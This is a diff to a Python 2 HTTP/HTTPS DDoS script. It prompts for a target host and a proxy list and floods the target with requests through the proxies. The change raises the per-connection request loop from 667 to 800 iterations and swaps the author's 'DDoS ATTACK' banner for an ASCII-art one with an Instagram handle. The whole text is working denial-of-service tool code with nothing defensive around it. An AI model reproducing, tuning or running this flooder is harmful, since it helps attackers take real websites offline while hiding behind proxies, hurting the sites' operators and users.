@@ -361,7 +361,7 @@ class Requests(threading.Thread):
                 time.sleep(5)
                 print "Attacking [ " + host_url + " ] with [" + proxy[0] + ":" + proxy[1] + "]\n"
                 try:
-                    for i in xrange(667):
+                    for i in xrange(800):
                         a.send(httprequest)
                         time.sleep(5)
                         print "Attacking [ " + host_url + " ] with [" + proxy[0] + ":" + proxy[1] + "]\n"
@@ -375,19 +375,18 @@ class Requests(threading.Thread):
  
  
 print \
-"""             
-                     
-                             DDoS ATTACK By BOSSY    
-                                Requests HTTP+HTTPS
-                                   Instagram : @0zctn
 """
-print '--------------------------------------------------------------------------------'
-print '--------------------------------------------------------------------------------'
-os.system('title       ........::::: Code By Thunder(BOSSY),Http Ddos Attack :::::........')
+               ╔╦╗╔═╗╔═╗╔═╗╔═╗
+               ║║║║ ║╠╣ ║ ║╚═╗
+               ╩ ╩╚═╝╚  ╚═╝╚═╝
+               Instagram : @0zctn
 
-url = raw_input("Host : ")
+"""
+print ' '
+
+url = raw_input(" Host : ")
 host_url = url.replace("http://", "").replace("https://", "").split('/')[0]
-in_file = open(raw_input("Proxy : "),"r")
+in_file = open(raw_input(" Proxy : "),"r")
 proxyf = in_file.read()
 in_file.close()
 listaproxy = proxyf.split('\n')
